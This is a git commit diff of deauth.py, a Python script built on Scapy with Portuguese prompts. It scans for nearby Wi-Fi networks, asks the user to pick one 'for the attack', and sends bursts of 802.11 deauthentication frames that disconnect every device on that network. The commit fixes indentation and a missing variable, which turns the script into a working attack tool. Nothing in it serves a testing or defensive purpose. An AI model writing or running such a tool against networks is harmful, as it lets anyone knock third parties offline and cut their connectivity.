f6d9d6598b06196f6fa9894aa8f3b16c6959fc54
Hiago Bernardo <105991097+Brazoo@users.noreply.github.com>
2023-07-24 12:47:34 -0300

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -1,7 +1,6 @@
 from scapy.all import *
 import os
 
-
 def get_wifi_networks(interface="wlan0mon"):
     networks = []
     scan_result = []
@@ -18,7 +17,6 @@ def get_wifi_networks(interface="wlan0mon"):
                 networks.append((essid, bssid))
     return networks
 
-
 def deauth_all_devices(target_bssid, iface="wlan0mon"):
     deauth_packet = (
         RadioTap()
@@ -26,20 +24,22 @@ def deauth_all_devices(target_bssid, iface="wlan0mon"):
         / Dot11Deauth()
     )
     sendp(deauth_packet, iface=iface, count=100, inter=0.1)
-    if __name__ == "__main__":
-        print("Escaneadno redes WI-FI ao redor...")
-        wifi_networks = get_wifi_networks()
-        if wifi_networks:
-            os.system("clear")
-            print("Redes WI-FI encontradas:")
-            for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
-                print(f"{idx}. ESSID: {essid}, BSSID: {bssid}")
-                selected_option = int(input("ID da rede para o ataque: "))
-                if 1 <= selected_option <= len(wifi_networks):
-                    print(f"Realizando o deauth na rede com BSSID: {selected_bssid}")
-                    deauth_all_devices(selected_bssid)
-                    print("Deauth enviado para todos os dispositivos na rede.")
-                else:
-                    print("Opção inválida.")
-            else:
-                print("O scan não identificou redes.")
+
+if __name__ == "__main__":
+    print("Escaneando redes WI-FI ao redor...")
+    wifi_networks = get_wifi_networks()
+    if wifi_networks:
+        os.system("clear")
+        print("Redes WI-FI encontradas:")
+        for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
+            print(f"{idx}. ESSID: {essid}, BSSID: {bssid}")
+        selected_option = int(input("ID da rede para o ataque: "))
+        if 1 <= selected_option <= len(wifi_networks):
+            selected_bssid = wifi_networks[selected_option - 1][1]
+            print(f"Realizando o deauth na rede com BSSID: {selected_bssid}")
+            deauth_all_devices(selected_bssid)
+            print("Deauth enviado para todos os dispositivos na rede.")
+        else:
+            print("Opção inválida.")
+    else:
+        print("O scan não identificou redes.")
